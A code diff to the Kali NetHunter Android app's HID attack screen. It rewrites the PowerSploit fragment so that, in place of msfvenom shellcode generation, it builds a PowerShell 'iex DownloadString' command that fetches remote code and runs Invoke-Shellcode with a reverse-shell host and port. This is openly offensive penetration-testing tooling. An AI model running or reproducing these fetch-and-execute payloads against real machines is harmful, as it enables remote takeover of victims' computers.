@@ -4,21 +4,18 @@ import android.app.ActionBar;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.FragmentTransaction;
-import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Parcelable;
 import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentStatePagerAdapter;
 import android.support.v4.view.ViewPager;
-import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuInflater;
@@ -26,6 +23,7 @@ import android.view.MenuItem;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.ViewGroup;
+import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Spinner;
@@ -36,7 +34,8 @@ import com.offsec.nethunter.utils.ShellExecuter;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.OutputStreamWriter;
-import java.util.concurrent.ExecutionException;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 //import android.app.Fragment;
 //import android.support.v4.app.FragmentActivity;
@@ -49,12 +48,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
     static NhPaths nh;
     final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
     final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portugese", "Russian", "Spanish", "Swedish"};
-    String msfvenom;
-    String msfvenomOut;
-    EditText newPayloadUrl;
-    Boolean isUrlpathSaved;
-    private static final String TAG = "HidFragment";
-
+    private String configFilePath;
 
     private static final String ARG_SECTION_NUMBER = "section_number";
 
@@ -68,6 +62,12 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         args.putInt(ARG_SECTION_NUMBER, sectionNumber);
         fragment.setArguments(args);
         return fragment;
+    }
+
+    @Override
+    public void onActivityCreated(Bundle savedInstanceState) {
+        configFilePath =   nh.CHROOT_PATH + "/var/www/html/powersploit-payload";
+        super.onActivityCreated(savedInstanceState);
     }
 
     @Override
@@ -98,9 +98,21 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         return rootView;
     }
 
+
     @Override
     public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
         inflater.inflate(R.menu.hid, menu);
+    }
+
+
+    public void onPrepareOptionsMenu(Menu menu) {
+        int pageNum = mViewPager.getCurrentItem();
+        if (pageNum == 0) {
+            menu.findItem(R.id.source_button).setVisible(true);
+        } else {
+            menu.findItem(R.id.source_button).setVisible(false);
+        }
+        getActivity().invalidateOptionsMenu();
     }
 
     @Override
@@ -117,6 +129,11 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                 return true;
             case R.id.chooseLanguage:
                 openLanguageDialog();
+                return true;
+            case R.id.source_button:
+                Intent i = new Intent(getActivity(), EditSourceActivity.class);
+                i.putExtra("path", configFilePath);
+                startActivity(i);
                 return true;
             default:
                 return super.onOptionsItemSelected(item);
@@ -338,6 +355,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
 
     public static class PowerSploitFragment extends HidFragment implements OnClickListener {
 
+        private String configFilePath =  nh.CHROOT_PATH + "/var/www/html/powersploit-payload";
         private String configFileUrlPath = nh.CHROOT_PATH + "/var/www/html/powersploit-url";
 
         @Override
@@ -351,6 +369,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
             View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
             Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
             b.setOnClickListener(this);
+            loadOptions(rootView);
             return rootView;
         }
 
@@ -360,73 +379,90 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     if(getView() == null){
                         return;
                     }
-                    isUrlpathSaved = false;
+                    ShellExecuter exe = new ShellExecuter();
                     EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                     EditText port = (EditText) getView().findViewById(R.id.port);
 
                     Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                     String payloadValue = payload.getSelectedItem().toString();
 
-                    newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
-                    msfvenom = "msfvenom -p " + payloadValue + " LHOST=" + ip.getText() + " LPORT=" + port.getText() + " -f powershell EXITFUNC=thread --platform windows -o /tmp/pwrshell_string";
+                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
+                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
+                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
-                    AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
-
-                        ProgressDialog pDialog;
-
-                    @Override
-                    protected void onPreExecute(){
-                        pDialog = new ProgressDialog(getActivity());
-                        pDialog.setMessage("Generating shellcode...");
-                        pDialog.show();
-                        pDialog.setCancelable(false);
-                        super.onPreExecute();
+                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                    if (!isSaved){
+                         nh.showMessage("Source not updated (configFileUrlPath)");
                     }
-
-                    @Override
-                    protected Void doInBackground(Void... params) {
-                        ShellExecuter exe = new ShellExecuter();
-                        String removecommand = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali custom_cmd \"rm -f /tmp/pwrshell_string >/dev/null\"'";
-                        String command = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali custom_cmd \"" + msfvenom + "\"'";
-                        String command2 = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali custom_cmd python /sdcard/nh_files/modules/powerball.py'";
-                        Log.d(TAG, command);
-                        exe.RunAsRootOutput(removecommand);
-                        exe.RunAsRootOutput(command);
-                        msfvenomOut = exe.RunAsRootOutput(command2);
-                        msfvenomOut = msfvenomOut.substring(7);
-
-                        return null;
-                    }
-
-                    @Override
-                    protected void onPostExecute(Void result) {
-                        Log.d(TAG, "MSFVENOMOUT: " + msfvenomOut);
-
-                        if(msfvenomOut.matches("(.*)Error opening file(.*)")){
-                            nh.showMessage("Problems with shellcode output!");
-                        } else {
-                            ShellExecuter exe = new ShellExecuter();
-                            String newString = "Invoke-Shellcode -Force -Shellcode " + msfvenomOut;
-                            String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
-                            isUrlpathSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                            if (!isUrlpathSaved){
-                                nh.showMessage("Source not updated (configFileUrlPath)");
-                            }
-                        }
-                        super.onPostExecute(result);
-                        if (pDialog != null) {
-                            pDialog.dismiss();
-                        }
-                    }
-                };
-                    task.execute((Void[])null);
                     break;
                 default:
                     nh.showMessage("Unknown click");
                     break;
             }
         }
+        private void loadOptions(final View rootView) {
+            final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
+            final EditText port = (EditText) rootView.findViewById(R.id.port);
+            final Spinner payload = (Spinner) rootView.findViewById(R.id.payload);
+            final ShellExecuter exe = new ShellExecuter();
+
+            new Thread(new Runnable() {
+                public void run() {
+                    final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
+                    final String text = exe.ReadFile_SYNC(configFilePath);
+                    String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
+                    Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
+                    final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
+
+                    String[] lines = text.split("\n");
+                    final String line = lines[lines.length - 1];
+
+                    String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
+                    Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
+                    final Matcher matcherIp = patternIp.matcher(line);
+
+                    String regExPatPort = "-Lport\\ (.*)\\ -Force";
+                    Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
+                    final Matcher matcherPort = patternPort.matcher(line);
+
+                    String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
+                    Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
+                    final Matcher matcherPayload = patternPayload.matcher(line);
+
+                    payloadUrl.post(new Runnable() {
+                        @Override
+                        public void run() {
+
+                            if (matcherPayloadUrl.find()) {
+                                String payloadUrlValue = matcherPayloadUrl.group(1);
+                                payloadUrl.setText(payloadUrlValue);
+                            }
+
+                            if (matcherIp.find()) {
+                                String ipValue = matcherIp.group(1);
+                                EditText ip = (EditText) rootView.findViewById(R.id.ipaddress);
+                                ip.setText(ipValue);
+                            }
+
+                            if (matcherPort.find()) {
+                                String portValue = matcherPort.group(1);
+                                port.setText(portValue);
+                            }
+
+                            if (matcherPayload.find()) {
+                                String payloadValue = matcherPayload.group(1);
+                                ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();
+                                int spinnerPosition;
+                                spinnerPosition = myAdap.getPosition(payloadValue);
+                                payload.setSelection(spinnerPosition);
+                            }
+                        }
+                    });
+                }
+            }).start();
+        }
     }
+
 
     public static class WindowsCmdFragment extends HidFragment implements OnClickListener {
 
